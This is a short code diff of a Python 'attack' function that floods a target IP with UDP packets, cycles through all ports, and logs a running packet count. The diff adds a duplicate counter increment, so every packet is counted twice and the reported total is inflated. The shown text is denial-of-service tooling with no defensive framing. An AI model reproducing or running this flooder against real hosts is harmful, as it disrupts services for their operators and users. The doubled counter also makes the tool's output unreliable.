@@ -52,6 +52,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
             sock.sendto(data, (ip, port))
             sent += 1
             log_message(f"\033[48;5;3m\033[30mIp Address\033[0m\033[37m•> {ip} \033[3mport:\033[0m\033[96m{port} \033[36mSent•> \033[37m{sent} \033[3mthreads\033[0m\033[38;5;220m•> {threading.get_ident()}")
+            sent += 1
             log_message(f"\033[38;5;220mIp Address\033[38;5;154m•> {ip} \033[3mport:\033[0m\033[37m{port}\033[0m \033[32mSent•> \033[38;5;206m{sent} \033[3mpacket_size\033[0m\033[37m•> {packet_size}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
